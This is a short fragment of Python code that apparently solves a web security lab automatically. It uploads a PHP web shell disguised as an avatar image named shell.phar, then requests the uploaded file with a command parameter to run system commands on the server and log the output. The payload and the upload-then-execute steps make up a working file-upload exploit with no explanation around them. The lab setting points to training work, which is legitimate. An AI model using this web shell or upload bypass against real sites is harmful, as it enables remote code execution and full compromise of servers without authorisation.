...
def solve_lab(session):
    ...
    files = {"avatar": ("shell.phar", '<?php echo SYSTEM($_GET["cmd"])?>')}
    ...
    resp = session.get_path("/files/avatars/shell.phar", params=params)
    logger.info(
        f'Got the following response from visiting "/files/avatars/shell.phar?{urlencode(params)}"'
    )
